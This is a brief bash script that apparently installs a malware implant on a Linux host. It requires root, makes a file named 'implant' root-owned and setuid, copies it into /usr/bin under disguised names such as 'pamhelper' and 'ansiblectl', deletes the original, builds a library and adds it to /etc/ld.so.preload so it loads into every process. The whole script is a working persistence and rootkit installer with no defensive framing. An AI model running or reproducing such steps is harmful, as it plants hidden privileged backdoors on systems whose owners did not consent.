#!/bin/bash

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Script must be run as root"
    exit
fi

chown root:root /tmp/implant
chmod a+s /tmp/implant

cp /tmp/implant /usr/bin/msgbus
cp /tmp/implant /usr/bin/pamhelper
cp /tmp/implant /usr/bin/ansiblectl
rm /tmp/implant

apt-get -y install gcc make cmake
make

mv libpamd.so /usr/local/lib/libpamd.so
echo /usr/local/lib/libpamd.so >> /etc/ld.so.preload
